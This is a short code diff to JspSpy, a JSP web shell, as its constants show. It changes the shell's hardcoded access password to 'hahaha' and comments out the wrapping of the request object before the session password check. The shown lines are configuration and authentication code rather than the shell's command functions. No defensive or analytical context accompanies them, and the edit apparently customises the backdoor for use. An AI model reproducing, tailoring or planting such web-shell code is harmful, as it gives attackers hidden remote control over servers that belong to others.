@@ -19,7 +19,7 @@
 	 * Blog http://www.Forjj.com/
 	 * Yue . I Love You.
 	 */
-	private static final String PW = "ninty"; //password
+	private static final String PW = "hahaha"; //password
 	private static final String PW_SESSION_ATTRIBUTE = "JspSpyPwd";
 	private static final String REQUEST_CHARSET = "ISO-8859-1";
 	private static final String PAGE_CHARSET = "UTF-8";
@@ -573,7 +573,7 @@
 			myAbsolutePath.lastIndexOf(File.separator)));
 	if (session.getAttribute(CURRENT_DIR) == null)
 		session.setAttribute(CURRENT_DIR, Util.convertPath(SHELL_DIR));
-	request = new MyRequest(request);
+	//request = new MyRequest(request);
 	if (session.getAttribute(PW_SESSION_ATTRIBUTE) == null
 			|| !(session.getAttribute(PW_SESSION_ATTRIBUTE)).equals(PW)) {
 		String o = request.getParameter("o");
